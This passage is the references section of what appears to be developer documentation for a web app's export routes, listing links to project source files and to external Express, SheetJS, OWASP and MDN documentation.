<!-- SECTION 8: REFERENCES -->
## 8. REFERENCES

**Project files**

- [exportRoutes.js](../server/routes/exportRoutes.js)
- [noteSchema.js](../server/models/noteSchema.js), [translationSchema.js](../server/models/translationSchema.js)
- [securityMiddleware.js](../server/middleware/securityMiddleware.js), [rateLimitMiddleware.js](../server/middleware/rateLimitMiddleware.js)
- [apiUtil.js](../server/util/apiUtil.js), [schemaUtil.js](../server/util/schemaUtil.js), [languageData.js](../server/util/languageData.js)
- [ExportForm.js](../client/src/components/ExportForm.js), [formUtil.js](../client/src/util/formUtil.js), [NotesList.js](../client/src/components/NotesList.js), [TranslationsList.js](../client/src/components/TranslationsList.js)
- [NOTE_ROUTES.md](NOTE_ROUTES.md), [TRANSLATION_ROUTES.md](TRANSLATION_ROUTES.md), [GLOSSARY.md](../GLOSSARY.md)

**External documentation**

- [Express: Routing](https://expressjs.com/en/guide/routing.html)
- [Express: `res.set()`](https://expressjs.com/en/api.html#res.set)
- [SheetJS (`xlsx`)](https://docs.sheetjs.com/)
- [csv-stringify](https://csv.js.org/stringify/)
- [express-rate-limit](https://github.com/express-rate-limit/express-rate-limit)
- [OWASP: CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)
- [MDN: `Object.hasOwn()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/hasOwn)
- [MDN: `Content-Disposition`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition)
- [MDN: `Access-Control-Expose-Headers`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Expose-Headers)
- [MDN: HTTP response status codes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status)
